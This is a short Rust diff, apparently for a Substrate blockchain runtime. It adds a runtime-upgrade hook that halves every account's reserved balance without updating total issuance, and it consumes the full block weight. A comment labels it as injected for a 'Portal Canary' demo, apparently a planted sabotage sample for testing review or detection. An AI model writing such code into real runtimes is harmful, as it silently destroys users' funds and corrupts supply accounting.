+/// INJECTED (Portal Canary demo): halves every reserved balance on upgrade
+/// without touching TotalIssuance, so supply is silently destroyed.
+pub struct HalveReserved;
+impl frame_support::traits::OnRuntimeUpgrade for HalveReserved {
+	fn on_runtime_upgrade() -> Weight {
+		let held: Vec<AccountId> = frame_system::Account::<Runtime>::iter()
+			.filter(|(_, a)| a.data.reserved > 0)
+			.map(|(who, _)| who)
+			.collect();
+		for who in held.iter() {
+			frame_system::Account::<Runtime>::mutate(who, |a| a.data.reserved /= 2);
+		}
+		RuntimeBlockWeights::get().max_block
+	}
+}
